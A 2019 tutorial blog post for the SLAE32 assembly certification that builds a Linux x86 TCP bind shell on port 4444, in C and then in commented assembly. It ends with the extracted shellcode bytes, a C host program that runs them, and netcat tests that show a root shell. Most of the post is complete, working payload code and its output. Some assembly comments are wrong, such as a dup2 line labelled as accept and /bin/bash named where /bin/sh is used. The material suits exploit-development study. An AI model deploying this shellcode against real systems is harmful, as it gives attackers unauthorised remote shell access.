---
title: SLAE32 Assignment 1 - TCP Bind-Shell Shellcode
date: 2019-8-10
layout: single
classes: wide
tags:
  - Bind
  - Shell
  - Assembly
  - Code
  - SLAE
  - Linux
  - x86
  - Shellcode
--- 
![](/assets/images/SLAE32.png)
```console
This blog post has been created for completing the requirements
 of the SecurityTube Linux Assembly Expert certification:
http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
	- Now at: https://www.pentesteracademy.com/course?id=3
SLAE/Student ID: PA-10913
```
## Overview
For the first Assigment of the SLAE32 course, we were tasked with creating shellcode for a TCP `bind-shell`.  

_What is shellcode?_   
Shellcode is machine code that is digestable by the processor it is executing on. 
+ No extra compiling or linking is required for the code to execute.
+ This makes `shellcode` perfect for `malware` and `exploits`. 

### Assembly
Processors only understand `Machine Code`. The closest thing to writing in `Binary` is to write `Assembly` code.
+ Compiled Assembly code has a 1:1 correlation with Machine code.

#### For Example:
```console
beta@zed$ msf-nasm_shell 
# Put the hex value 0x2 into the al register
nasm > mov al, 0x2
00000000  B002              mov al,0x2
  - Here we see the Machine Code equivalent for `mov al, 0x2` is 0xB0, 0x02
  - This Assembly instruction is always this hex/machine code for any intel-32 bit processor.
# Put the hex value 0x1 into the bl register
nasm > mov bl, 0x1
00000000  B301              mov bl,0x1
# Add the bl register to the al register, and save the result in register al
nasm > add al, bl
00000000  00D8              add al,bl
```

+ Assembly Language is dependant on the processor it is executing on, and the operating system.
+ For this course all Assembly will be written for Intel 32-bit Architecture, and the Linux Operating System.

# Mapping C Code to Assembly
To map out how I was going to write Assembly Code for this assgnment, I first created a tcp bind shell using C.  
+ C is the closest programming language to Assembly.

Once I figured out which C functions I needed, I then had to figure out how to replace them with Linux System-Calls.  

## Required C Funtions & Execution Flow
1. Create a new Socket.  
```c
int ipv4Socket = socket(AF_INET, SOCK_STREAM, 0);
```
2. Create a TCP-IP Address for the Socket.  
```c
struct sockaddr_in ipSocketAddr = { 
  .sin_family = AF_INET,
  .sin_port = htons(4444),
  .sin_addr.s_addr = htonl(INADDR_ANY)
};
```
3. Bind the TCP-IP Address to the Socket.  
```c
bind(ipv4Socket, (struct sockaddr*) &ipSocketAddr, sizeof(ipSocketAddr));
```
4. Listen for incoming connections on the TCP-IP Socket.  
```c
listen(ipv4Socket, 0);
```
5. Accept the incoming connections, on the TCP-IP Socket, and create a new connected session.  
```c
int clientSocket = accept(ipv4Socket, NULL, NULL);
```
6. Transfer Standard-Input, Standard-Output, and Standard-Error to the connected session.  
```c
dup2(clientSocket, 0); // STDIN
dup2(clientSocket, 1); // STDOUT
dup2(clientSocket, 2); // STDERR
```
7. Spawn a `/bin/sh` shell for the client, in the connected session.
```c
execve("/bin/sh", NULL, NULL);
```

## Creating a TCP Bind Shell in C
This is our C program to create a TCP Bind Shell.  

```c
// Filename: basicBindShell.c
// Author:   boku
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h> /* superset of previous */
#include <stdlib.h>

int main(void)
{
  int ipv4Socket = socket(AF_INET, SOCK_STREAM, 0);
  struct sockaddr_in ipSocketAddr = {
    .sin_family = AF_INET,
    .sin_port = htons(4444),
    .sin_addr.s_addr = htonl(INADDR_ANY)
  };
  bind(ipv4Socket, (struct sockaddr*) &ipSocketAddr, sizeof(ipSocketAddr));
  listen(ipv4Socket, 0);
  int clientSocket = accept(ipv4Socket, NULL, NULL);
  dup2(clientSocket, 0);
  dup2(clientSocket, 1);
  dup2(clientSocket, 2);
  execve("/bin/sh", NULL, NULL);
}
```

Great, before we dive into how this was created, lets test it to make sure it works.

### Compiling C Bind Shell
```console
root# gcc basicBindShell.c -o basicBindShell
```

### Testing Our Shellcode in the Host Program
#### Terminal Window 1
```console
root# ./basicBindShell
```
#### Terminal Window 2
```console
root# netstat -tanlp | grep basicBind
tcp   0   0 0.0.0.0:4444    0.0.0.0:*   LISTEN    31804/basicBindShell
root# nc.traditional 127.0.0.1 4444
id
uid=0(root) gid=0(root) groups=0(root)
```
Awesome! It works. Lets dive into these C functions and how they work.

### 1. Create a new Socket
Our first function is `socket()`. We already know that this function is used to create a new socket.   
To find out more about this function we will use the command `man 7 socket` from our linux terminal.  
```console
man 7 socket
  int socket(int domain, int type, int protocol);
```
Our requirements, for our bind shell, are that at Layer 3 we use the IP version 4 Protocol, and at Layer 4 we use the Transmission Control Protocol (TCP).  
After reviewing the `socket()` man pages, we discover we will need to fufill the following arguements.
+ `int domain`   = `AF_INET`
  - IPv4 Internet protocols.
+ `int type`     = `SOCK_STREAM` 
  - Provides sequenced, reliable, two-way, connection-based byte streams (TCP).
+ `int protocol` = `0` 
  - The protocol to be used with the socket. 
  - Normally there is only one protocol per socket type. In this case the protocol value is `0`.

#### Our C function
```c
int ipv4Socket = socket(AF_INET, SOCK_STREAM, 0);
```

### 2. Create a TCP-IP Address for the Socket
Now that our IPv4, TCP socket has been created, we will need to create an address for it. After creating the TCP-IP address, we will bind the address to the socket.  
To create the TCP-IP address (TCP Port Number & IP Address), we will dig into the `ip` man pages with command `man 7 ip`.   
We find this relevant information:
```c
// An IP socket address is defined as a combination of an IP 
//  interface address and a 16-bit port number.
struct sockaddr_in {
  sa_family_t    sin_family; // address family: AF_INET
  in_port_t      sin_port;   // port in network byte order. See "man htons".
  struct in_addr sin_addr;   /* internet address */
 };
```
This is the struct we will need to fufill the third arguement in the above struct.
```c
struct in_addr {
     uint32_t       s_addr;     /* address in network byte order */
 };
```
From the above information, we know that we will need to use the Address Family `AF_INET`, then give it a port number (we will use TCP port 4444), and finally we will bind it to any/all interfaces using `INADDR_ANY`.   

#### Our C struct
```c
struct sockaddr_in ipSocketAddr = { 
  .sin_family = AF_INET, 
  .sin_port = htons(4444), 
  .sin_addr.s_addr = htonl(INADDR_ANY)
};
```
+ `man htons` - The `htons()` function converts an unsigned short integer hostshort from host byte order to network byte order.
+ `man htonl` - The `htonl()` function converts the unsigned integer hostlong from host byte order to network byte order.

### 3. Bind the TCP-IP Address to the Socket
Now that we have a socket, a TCP port, and an IPv4 interface, we need to bind them all together.  
we will use the `bind()` C function to accomplish this, and dive into the man pages to discover the arguements we will need with the command `man 2 bind`.  
```c
int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);  
```
+ `sockfd`
  - The socket file descriptor is the variable `ipv4Socket` we created earlier when creating the socket.  
+ `struct sockaddr *addr`
  - A pointer to the TCP-IP Socket Address we created earlier with the variable `ipSocketAddr`.  
+ `socklen_t addrlen`
  - The final arguement is simply the byte length of our `ipSocketAddr` struct. 
  - We will fufill this using the C `sizeof()` function to do the work for us. 

#### Our C function   
```c
bind(ipv4Socket, (struct sockaddr*) &ipSocketAddr, sizeof(ipSocketAddr));
```

### 4. Listen for incoming connections on the TCP-IP Socket
Now that we have bound an address to our socket, we will need to configure it to be in the listening state. Allowing the socket to listen for incoming connections.   
To learn what we need to do we consult the manual page with `man 2 listen`.   
We find that the `listen()` function requires two arguments.  
```c
int listen(int sockfd, int backlog);
```
+ `sockfd`
  - Simply our `ipv4Socket` variable. 
+ `backlog`
  - This is for handling multiple connections. 
  - We only need to handle one connection at a time, therefor we will set this value to `0`. 

#### Our C function  
```c
listen(ipv4Socket, 0);
```

### 5. Accept the incoming connections and create a new connected session
Now that our socket is listening we need to accept the incoming connections with the C function `accept()`.  
Consulting the manual page with `man 2 accept` we find that:  
```c
// the accept function takes the connection request from the listen
//  function and creates a new connected socket.
int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
```

We will give our `accept()` function the variable name `clientSocket`. We will use our `ipv4Socket` variable we created earlier to fulfill the `int sockfd` arguments, and set the remaining two arguments to `NULL`.   

#### Our C function
```c
int clientSocket = accept(ipv4Socket, NULL, NULL);
```

### 6. Transfer STDIN, STDOUT, STDER to the connected session
Now that we have a tcp socket listening and accepting incoming connections, we will need to pass the input, output, and error messages from the program, to the connecting client. This will allow the connecting client to input text using their keyboard, and read the output that is returned.  
We will duplicate the File Descriptors for Standard Input(0), Standard Output(1), and Stadard Error(2) to the newly created, connected socket using the dup2() function three times. We will consult the man pages for more information will `man 2 dup2`.   
```c
int dup2(int oldfd, int newfd);
```
We find that the `dup2()` function requires 2 arguements. The first arguement `int oldfd` we be fufilled using the `clientSocket` variable we created earlier. The second arguement `int newfd` will be fufilled using the number value for STDIN(0), STDOUT(1), and STDERR(2) respectively.  
#### Our three dup2 functions 
```c
dup2(clientSocket, 0);
dup2(clientSocket, 1);
dup2(clientSocket, 2);
```

### 7. Spawn a "/bin/sh" shell in the connected session
At this point we have our program listening, and accepting connections from incoming clients. Once the client connects, the input and output of our program is passed over to the connecting client. The last thing we need to do is execute a program for our client to interact with.  
We will use the C function `execve()` to execute the shell `/bin/bash`.  
Consulting the manual pages with `man 2 execve` we find:  
```c
int execve(const char *filename, char *const argv[], char *const envp[]);
```
We discover that since we are not passing any additional options/flags/enviorment-settings to our `/bin/sh` program, we may set the arguments `argv[]` and `envp[]` to `NULL`. The first arguement `*filename` requires we give it the full path to our program `/bin/sh`.  
#### Our C function 
```c
execve("/bin/sh", NULL, NULL);
```

## Mapping System Calls to C Functions
To find all the Linux System Calls we will read the header file `unistd_32.h`.  
Finding the System Call Number for Socket:  
```console
cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep "socket"
  #define __NR_socketcall   102
```  
 At the Assembly level, the System-Call - `socketcall 102`, is used for 5 of the C functions we need:    
 `socket(), bind(), connect(), listen(), accept()` 
 
To differentiate between which function to call, a corresponding value is held in the EBX Register.  
These Values can be found with:  
```console
cat /usr/include/linux/net.h
  #define SYS_SOCKET   1   /* sys_socket(2)   */
  #define SYS_BIND     2   /* sys_bind(2)     */
  #define SYS_CONNECT  3   /* sys_connect(2)  */
  #define SYS_LISTEN   4   /* sys_listen(2)   */
  #define SYS_ACCEPT   5   /* sys_accept(2)   */
```    
Like all System Calls Linux, they are triggered when the Assembly instruction `int 0x80` is executed.  
+ At the time of the interrupt, the value stored in the `EAX` register determines which system call is executed.  

From above, we see that five of our C funtions use the same system call - `socketcall 102`.  
+ For these functions, `EAX` will hold the value `102` (`0x66` in Hex).

The system call `socketcall` will know what to do (create a socket, listen, accept incoming connection, etc), based on the value stored in the `EBX` register.   
The arguments of the C level function will be pushed onto the stack, and the `ECX` register will point to the top of the `stack`.  
+ Stack Memory grows from high memory to low memory.
+ We will need to store arguements in reverse order on the stack.

Once we have pushed our array of consecutive arguments onto the stack, all we need to do is point the `ECX` register to the top of the `stack`.

## Creating the Assembly Shellcode
### 1. Create a new Socket
#### C Function
```c
int socket(int domain, int type, int protocol);
```
#### Our C Function
```c
<socketcall>  int ipv4Socket = socket( AF_INET, SOCK_STREAM, 0 );
  EAX=0x66                      EBX     ECX[0]   ECX[1]    ECX[2]
```
+ `EAX = 102 = 0x66`
  - This is the value to call the SYSCAL `socketcall`. 
+ `EBX = 1   = 0x1`
  - Value for `socket()` function relative to the SYSCAL `socketcall`.  
```c
#define SYS_SOCKET      1          // sys_socket(2)
```
+ `ECX[0] = AF_INET = 2 = 0x2`
  - Find value of `AF_INET`:  
  ```console
  cat /usr/include/i386-linux-gnu/bits/socket.h | grep AF_INET
    #define AF_INET         PF_INET    // We see that AF_INET is mapped to PF_INET
  ```		
  - Find value of `PF_INET`: 
  ```console
  cat /usr/include/i386-linux-gnu/bits/socket.h | grep PF_INET
    #define PF_INET         2          // IP protocol family.
  ```  
+ `ECX[1] = SOCK_STREAM = 1 = 0x1`
  - Find value of `SOCK_STREAM`: 
  ```console
  cat /usr/src/linux-headers-$(uname -r)/include/linux/net.h | grep SOCK_STREAM
    SOCK_STREAM	= 1
```  
+ `ECX[2] = 0 = 0x0`
  - For a TCP socket, the only option for the `int protocol` is `0`.

```nasm
xor eax, eax      ; This sets the EAX Register to NULL (all zeros).
mov al, 0x66      ; EAX is now 0x00000066 = SYSCALL 102 - socketcall
xor ebx, ebx      ; This sets the EBX Register to NULL (all zeros).
mov bl, 0x1       ; EBX is set to create a socket
xor ecx, ecx      ; This sets the ECX Register to NULL (all zeros).
push ecx          ; ECX[2]. ECX is NULL, the value needed for the first
                  ;   argument we need to push onto the stack
push ebx          ; ECX[1]. EBX already has the value we need for ECX[1] 
                  ;   we will simply use it to push the value 1.
push dword 0x2    ; ECX[0]. Push the value 2 onto the stack, needed for AF_INET.
mov ecx, esp      ; ECX now holds the pointer to the beginning of the 
                  ;   argument array stored on the stack.
int 0x80          ; System Call Interrupt 0x80 - Executes socket(). 
                  ;   Creates the Socket.
xchg esi, eax     ; After the SYSCAL, sockfd is stored in the EAX Register. 
                  ;   Move it to the ESI Register; we will need it later.
```

### 2+3. Create a TCP-IP Address and Bind it to the Socket
#### C Function
```c
int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
```
#### Our C Function 
```c   
<socketcall>   bind(ipv4Socket, (struct sockaddr*) &ipSocketAddr, sizeof(ipSocketAddr));
  EAX=0x66     EBX    ECX[0]                   ECX[1]                  ECX[2] 
```   
+ `EAX = 102 = 0x66`
  - This is the value to call the SYSCAL `socketcall`.
+ `EBX = 2 = 0x2`
  - Value for `socket()` function relative to the SYSCAL `socketcall`.  
  `#define SYS_BIND        2          // sys_bind(2)`   
+ `ECX[0] = int sockfd = ESI`
  - The Socket we created earlier and stored in the ESI register   
+ `ECX[1] = const struct sockaddr *addr`
  - This will point to the Struct (array of variables) we will store onto the Stack.  
+ `ECX[2] = sizeof(ipSocketAddr)`
  - The Binary Length of the Struct we will store in ECX[1]. 
 
This System Call is tricky because we will need to have an array within an array.  
+ `ECX[1]` will point to the start of the array of 3 variables on the Stack.  
+ We will push these 3 variables onto the stack first, then we will push `ECX[2]`, `ECX[1]`, and finally `ECX[0]`.  

 This is the struct we used in C to store the IP-Socket Address values used for the bind() function call:  

```c
struct sockaddr_in ipSocketAddr = { 
  .sin_family = AF_INET,         // ARG[0]
  .sin_port = htons(4444),       // ARG[1]
  .sin_addr.s_addr = INADDR_ANY  // ARG[2]
};
```  

+ `ARG[0] = AF_INET = 0x2`
  - We know this value from the last SYSCAL we did.  
+ `ARG[1] = htons(4444) =  0x5c11`
  - All this means is `4444` in reverse, in Hex (`0x115C`).
  - Everything pushed onto the Stack needs to be in reverse.  
+ `ARG[2] = INADDR_ANY = 0x00000000`
  - All Network Interfaces
  - Find value for `INADDR_ANY`: 
```console
 cat /usr/src/linux-headers-$(uname -r)/include/uapi/linux/in.h | grep INADDR_ANY  
   #define INADDR_ANY ((unsigned long int) 0x00000000)
```
 
 The order to push all this on the stack will be:   
1. `ARG[2]`  
2. `ARG[1]`  
3. `ARG[0]`  
4. `ECX[2]`  
5. `ECX[1]`  
6. `ECX[0]`  

```nasm
xor eax, eax      ; This sets the EAX Register to NULL (all zeros).
mov al, 0x66      ; EAX is now 0x00000066 = SYSCALL 102 - socketcall
xor ebx, ebx      ; This sets the EBX Register to NULL (all zeros).
mov bl, 0x2       ; EBX is set to create a socket
xor edx, edx      ; This sets the EDX Register to NULL (all zeros).
push edx          ; ARG[2]. EDX is NULL, the value needed for INADDR_ANY.
push word 0x5c11  ; ARG[1]. This is for the TCP Port 4444.
push bx           ; ARG[0]. Push the value 2 onto the stack, needed for AF_INET.
xor ecx, ecx      ; This sets the EAX Register to NULL (all zeros).
mov ecx, esp      ; Save the memory location of ARG[0] into the EDX Register.
                  ;   We will use this for ECX[1].
push 0x10         ; ECX[2]. Our Struct of ARG's is now 16 bytes long (0x10 in Hex). 
push ecx          ; ECX[1]. The pointer to the beginning of the struct we saved is 
                  ;  now loaded up for ECX[1].
push esi          ; ECX[0]. This is the value we saved from creating the Socket earlier. 
mov ecx, esp      ; Now all that is left is to point ECX to the top of the loaded stack.
int 0x80          ; System Call Interrupt 0x80 
```

### 4. Listen for incoming connections on the TCP-IP Socket
#### C Function
```c
int listen(int sockfd, int backlog);    
```
#### Our C Function
```c
<socketcall>   listen( ipv4Socket, 0 );
  EAX=0x66      EBX      ECX[0]   ECX[1]
```  
+ `EAX    = 102 = 0x66`
  - This is the value to call the SYSCAL `socketcall`.   
+ `EBX    = 4   = 0x4`
  - Value for `listen()` function relative to the SYSCAL `socketcall`.  
```c
#define SYS_LISTEN  4 // sys_listen(2)
```
+ `ECX[0] = int sockfd = ESI`
  - The Socket we created earlier and stored in the `ESI` register.  
+ `ECX[1] = 0x0`
  - We have no need for a `backlog` so this value will be `0`.  

```nasm
xor eax, eax     ; This sets the EAX Register to NULL (all zeros).
mov al, 0x66     ; EAX is now 0x00000066 = SYSCALL 102 - socketcall
xor ebx, ebx     ; This sets the EBX Register to NULL (all zeros).
mov bl, 0x4      ; EBX is set to listen().
xor ecx, ecx     ; This sets the ECX Register to NULL (all zeros).
push ecx         ; ECX[1]. Push the value 0x0 to the stack.
push esi         ; ECX[0]. This is the value we saved from creating the Socket earlier. 
mov ecx, esp     ; Point ECX to the top of the stack. 
int 0x80         ; Executes listen(). Allowing us to handle incoming TCP-IP Connections.
```

### 5. Accept the Incoming Connection, and Create a New Connected Session
#### C Function
```c
int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen, int flags);
```
#### Our C Function        
```c
<socketcall>   clientSocket = accept( ipv4Socket, NULL, NULL );
EAX=0x66                       EBX     ECX[0]    ECX[1] ECX[2]
```
+ `EAX    = 102  = 0x66`
  - This is the value to call the SYSCAL `socketcall`.  
+ `EBX    = 5    = 0x5`
  - Value for `accept()` function relative to the SYSCAL `socketcall`.  
  - `#define SYS_ACCEPT      5         // sys_accept(2)`  
+ `ECX[0] = int sockfd = ESI`
  - The Socket we created earlier and stored in the ESI register  
+ `ECX[1] = NULL = 0x00000000`  
+ `ECX[2] = NULL = 0x00000000`  
       
```nasm
xor eax, eax     ; This sets the EAX Register to NULL (all zeros).
mov al, 0x66     ; EAX is now 0x00000066 = SYSCALL 102 - socketcall
xor ebx, ebx     ; This sets the EBX Register to NULL (all zeros).
mov bl, 0x5      ; EBX is set to accept().
xor ecx, ecx     ; This sets the ECX Register to NULL (all zeros).
push ecx         ; ECX[2]. Push the value 0x0 to the stack.
push ecx         ; ECX[1]. Push the value 0x0 to the stack.
push esi         ; ECX[0]. This is the value we saved from creating the Socket earlier. 
mov ecx, esp     ; Point ECX to the top of the stack. 
int 0x80         ; System Call Interrupt 0x80 
xchg ebx, eax    ; The created clientSocket is stored in EAX after receiving a connection.
```

### 6. Transfer STDIN, STDOUT, and STDER to the Connected Session
#### C Function
```c
int dup2(int oldfd, int newfd);  
```
#### Our C Function            
```c
dup2( clientSocket, 0 ); // STDIN
dup2( clientSocket, 1 ); // STDOUT
dup2( clientSocket, 2 ); // STDERR
EAX       EBX      ECX     
```
+ `EAX = 63 = 0x3F`
  - This is the value to call the SYSCAL `dup2`.  
  - Find Dup2 SYSCAL value:  
```console
cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep dup2
  #define __NR_dup2  63
```   
+ `EBX = int oldfd = clientSocket`
  - Already set with `xchg ebx, eax` after the execution of `accept()`.  
+ `ECX = 2 & 1 & 0 = 0x2 & 0x1 & 0x0`
  - Since we need to do this SYSCAL 3 times, we will use a loop.

```nasm  
 xor eax, eax   ; This sets the EAX Register to NULL (all zeros).
 xor ecx, ecx   ; This sets the ECX Register to NULL (all zeros). 
 mov cl, 0x2    ; This sets the loop counter, and 
                ;  will also be the value of "int newfd" for the 3 dup2 SYSCAL's.
dup2Loop:       ; Procedure label for the dup2 Loop.
 mov al, 0x3f   ; EAX is now 0x0000003F = SYSCALL 63 - dup2
 int 0x80       ; System Call Interrupt 0x80 - Executes accept(). 
                ;   Allowing us to create connected Sockets. 
 dec ecx        ; Decrements ECX by 1 
 jns dup2Loop   ; Jump back to the dup2Loop Procedure until ECX equals 0.
```  

### 7. Spawn a `/bin/sh` shell for the client, in the connected session
#### Default C Function
```c
int execve(const char *filename, char *const argv[], char *const envp[]);
```  
#### Our C Function
```c
; execve("/bin//sh", NULL, NULL);
;  EAX      EBX       ECX   EDX
```
The Execve SysCall is used to execute programs on the linux system. In our case, we will execute a shell in the connected socket.  
We will turn to the man pages with command `man 2 execve` to learn more about `execve()`. 
```c
int execve(const char *filename, char *const argv[], char *const envp[]);
```
+ `EAX = int execve() = 11`
  - System Call Number for `execve`  
```console
cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep execve
  #define __NR_execve   11	
```  
+ `EBX = const char *filename = address of string ("/bin/bash" + "0x00")`
  - Pointer to string in memory storing `/bin/bash` + `NULL Terminated` 
  - `NULL Terminated` ends the string `0x00`  
+ `ECX = char *const argv[] = [ memory address of string "/bin/bash", 0x00000000 ]`
  - Array of argument strings passed to the new program.  
  - #1 = Address of `/bin/bash` in memory  
  - #2 = DWORD (32bit) `NULL = 0x00000000`  
+ `EDX =  char *const envp[] = 0x00000000` 
  - Array of strings which are passed as environment variables to the program.

```nasm
push edx         ; NULL
push 0x68732f2f	 ; "hs//"
push 0x6e69622f  ; "nib/"
mov ebx, esp     ; point ebx to stack
mov ecx, edx     ; NULL
mov al, 0xb      ; execve System Call Number
int 0x80         ; execute execve
```

## Complete TCP Bind Shell Assembly Code

```nasm
; Author: boku
; Purpose: TCP Bind Shell Shellcode
;  Listens on all IPv4 Interfaces, TCP Port 4444
;  Spawns the shell "/bin/sh" upon connection
global _start

section .text

_start:
; 1. Create a new Socket
; <socketcall>  ipv4Socket = socket( AF_INET, SOCK_STREAM, 0 );
;   EAX=0x66                  EBX     ECX[0]   ECX[1]    ECX[2]
xor eax, eax      ; This sets the EAX Register to NULL (all zeros).
mov al, 0x66      ; EAX is now 0x00000066 = SYSCALL 102 - socketcall
xor ebx, ebx      ; This sets the EBX Register to NULL (all zeros).
mov bl, 0x1       ; EBX is set to create a socket
xor ecx, ecx      ; This sets the ECX Register to NULL (all zeros).
push ecx          ; ECX[2]. ECX is NULL, the value needed for the first
                  ;   argument we need to push onto the stack
push ebx          ; ECX[1]. EBX already has the value we need for ECX[1] 
                  ;   we will simply use it to push the value 1.
push dword 0x2    ; ECX[0]. Push the value 2 onto the stack, needed for AF_INET.
mov ecx, esp      ; ECX now holds the pointer to the beginning of the 
                  ;   argument array stored on the stack.
int 0x80          ; System Call Interrupt 0x80 - Executes socket(). 
                  ;   Creates the Socket.
xchg esi, eax     ; After the SYSCAL, sockfd is stored in the EAX Register. 
                  ;   Move it to the ESI Register; we will need it later.

; 2+3. Create TCP-IP Address and Bind the Address to the Socket
; struct sockaddr_in ipSocketAddr = { 
; .sin_family = AF_INET, .sin_port = htons(4444), .sin_addr.s_addr = INADDR_ANY};
;       ARG[0]               ARG[1]                          ARG[2]
;<socketcall>   bind(ipv4Socket, (struct sockaddr*) &ipSocketAddr, sizeof(ipSocketAddr));  
;  EAX=0x66      EBX   ECX[0]                   ECX[1]                   ECX[2]
xor eax, eax      ; This sets the EAX Register to NULL (all zeros).
mov al, 0x66      ; EAX is now 0x00000066 = SYSCALL 102 - socketcall
xor ebx, ebx      ; This sets the EBX Register to NULL (all zeros).
mov bl, 0x2       ; EBX is set to create a socket
xor edx, edx      ; This sets the EDX Register to NULL (all zeros).
push edx          ; ARG[2]. EDX is NULL, the value needed for INADDR_ANY.
push word 0x5c11  ; ARG[1]. This is for the TCP Port 4444.
push bx           ; ARG[0]. Push the value 2 onto the stack, needed for AF_INET.
xor ecx, ecx      ; This sets the EAX Register to NULL (all zeros).
mov ecx, esp      ; Save the memory location of ARG[0] into the EDX Register. 
                  ;   We will use this for ECX[1].
push 0x10         ; ECX[2]. Our Struct of ARG's is now 16 bytes long (0x10 in Hex). 
push ecx          ; ECX[1]. The pointer to the beginning of the struct we saved is now 
                  ;   loaded up for ECX[1].
push esi          ; ECX[0]. This is the value we saved from creating the Socket earlier. 
mov ecx, esp      ; Now we need to point ECX to the top of the loaded stack.
int 0x80          ; System Call Interrupt 0x80

; 4. Listen for incoming connections on TCP-IP Socket.
; <socketcall>   listen( ipv4Socket, 0 );  
;   EAX=0x66      EBX      ECX[0]   ECX[1]  
xor eax, eax     ; This sets the EAX Register to NULL (all zeros).
mov al, 0x66     ; EAX is now 0x00000066 = SYSCALL 102 - socketcall
xor ebx, ebx     ; This sets the EBX Register to NULL (all zeros).
mov bl, 0x4      ; EBX is set to listen().
xor ecx, ecx     ; This sets the ECX Register to NULL (all zeros).
push ecx         ; ECX[1]. Push the value 0x0 to the stack.
push esi         ; ECX[0]. This is the value we saved from creating the Socket earlier. 
mov ecx, esp     ; Point ECX to the top of the stack. 
int 0x80         ; Executes listen(). Allowing us to handle incoming TCP-IP Connections.

; 5. Accept the incoming connection, and create a connected session.
; <socketcall>   clientSocket = accept( ipv4Socket, NULL, NULL ); 
;   EAX=0x66                     EBX     ECX[0]    ECX[1] ECX[2] 
xor eax, eax     ; This sets the EAX Register to NULL (all zeros).
mov al, 0x66     ; EAX is now 0x00000066 = SYSCALL 102 - socketcall 
xor ebx, ebx     ; This sets the EBX Register to NULL (all zeros).
mov bl, 0x5      ; EBX is set to accept().
xor ecx, ecx     ; This sets the ECX Register to NULL (all zeros).
push ecx         ; ECX[2]. Push the value 0x0 to the stack.
push ecx         ; ECX[1]. Push the value 0x0 to the stack.
push esi         ; ECX[0]. This is the value we saved from creating the Socket earlier.
mov ecx, esp     ; Point ECX to the top of the stack.
int 0x80         ; System Call Interrupt 0x80 
xchg ebx, eax    ; The created clientSocket is stored in EAX after receiving a connection.

; 5. Transfer STDIN, STDOUT, STDERR to the connected Socket.
; dup2( clientSocket, 0 ); // STDIN 
; dup2( clientSocket, 1 ); // STDOUT
; dup2( clientSocket, 2 ); // STDERR
; EAX       EBX      ECX
xor eax, eax   ; This sets the EAX Register to NULL (all zeros).
xor ecx, ecx   ; This sets the ECX Register to NULL (all zeros).
mov cl, 0x2    ; This sets the loop counter, and
               ;  will also be the value of "int newfd" for the 3 dup2 SYSCAL's.
dup2Loop:      ; Procedure label for the dup2 Loop.
mov al, 0x3f   ; EAX is now 0x0000003F = SYSCALL 63 - dup2
int 0x80       ; System Call Interrupt 0x80 - Executes accept(). 
               ;   Allowing us to create connected Sockets. 
dec ecx        ; Decrements ECX by 1 
jns dup2Loop   ; Jump back to the dup2Loop Procedure until ECX equals 0.

; 7. Spawn a "/bin/sh" shell for the client, in the connected session. 
; execve("/bin//sh", NULL, NULL);
;  EAX      EBX       ECX   EDX
push edx         ; Push NULL to terminate the string.
push 0x68732f2f	 ; "hs//" - Needs to be 4 bytes to fit on stack properly
push 0x6e69622f  ; "nib/" - This is "/bin//sh" backwards.
mov ebx, esp     ; point ebx to stack where /bin//sh +\x00 is located
mov ecx, edx     ; NULL
mov al, 0xb      ; execve System Call Number - 11
int 0x80         ; execute execve with system call interrupt
```

## Compiling & Testing the Assembly Shellcode
### Compiling the Shellcode
```console
nasm -f elf32 bindShell.asm -o bindShell.o
ld bindShell.o -o bindShell
```

### Testing the reverse shell program
#### Terminal Window 1
```console
./bindShell
```
#### Terminal Window 2
```console
root# netstat -tnalp | grep 4444
tcp     0    0 0.0.0.0:4444     0.0.0.0:*   LISTEN   7760/bindShell
root# nc.traditional 127.0.0.1 4444
id
uid=0(root) gid=0(root) groups=0(root)
```
Great! Now we know our Assembly bind shell works.  
The next step is to see if the shellcode works while inside a host program.  

### Extracting the Shellcode Hex from the compiled binary
```nasm
root# objdump -d bindShell | grep '[0-9a-f]:' | \
> grep -v 'file' | cut -f2 -d: | cut -f1-6 -d' ' | \
> tr -s ' ' | tr '\t' ' ' | sed 's/ $//g' | \
> sed 's/ /\\x/g' | paste -d '' -s | \
>  sed 's/^/"/' | sed 's/$/"/g'
"\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x53\x6a\x02\x89"
"\xe1\xcd\x80\x96\x31\xc0\xb0\x66\x31\xdb\xb3\x02\x31\xd2\x52"
"\x66\x68\x11\x5c\x66\x53\x31\xc9\x89\xe1\x6a\x10\x51\x56\x89"
"\xe1\xcd\x80\x31\xc0\xb0\x66\x31\xdb\xb3\x04\x31\xc9\x51\x56"
"\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x31\xdb\xb3\x05\x31\xc9\x51"
"\x51\x56\x89\xe1\xcd\x80\x93\x31\xc0\x31\xc9\xb1\x02\xb0\x3f"
"\xcd\x80\x49\x79\xf9\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
"\x6e\x89\xe3\x89\xd1\xb0\x0b\xcd\x80"
```

### Adding the Shellcode to a Host Program
```c
// Author:   boku
// Filename: shellcode.c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x53\x6a\x02\x89"
"\xe1\xcd\x80\x96\x31\xc0\xb0\x66\x31\xdb\xb3\x02\x31\xd2\x52"
"\x66\x68\x11\x5c\x66\x53\x31\xc9\x89\xe1\x6a\x10\x51\x56\x89"
"\xe1\xcd\x80\x31\xc0\xb0\x66\x31\xdb\xb3\x04\x31\xc9\x51\x56"
"\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x31\xdb\xb3\x05\x31\xc9\x51"
"\x51\x56\x89\xe1\xcd\x80\x93\x31\xc0\x31\xc9\xb1\x02\xb0\x3f"
"\xcd\x80\x49\x79\xf9\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
"\x6e\x89\xe3\x89\xd1\xb0\x0b\xcd\x80";

main()
{
        printf("Shellcode Length:  %d\n", strlen(code));
        int (*ret)() = (int(*)())code;
        ret();
}
```

### Compiling the Host Program
```console
root# gcc -fno-stack-protector -z execstack -o shellcode shellcode.c 
```

### Testing the Shellcode within by Executing the Host Program
#### Terminal Window 1
```console
root# ./shellcode 
Shellcode Length:  114
```
#### Terminal Window 2
```console
root# netstat -tnalp | grep shellcode
tcp      0      0 0.0.0.0:4444     0.0.0.0:*   LISTEN    19143/shellcode 
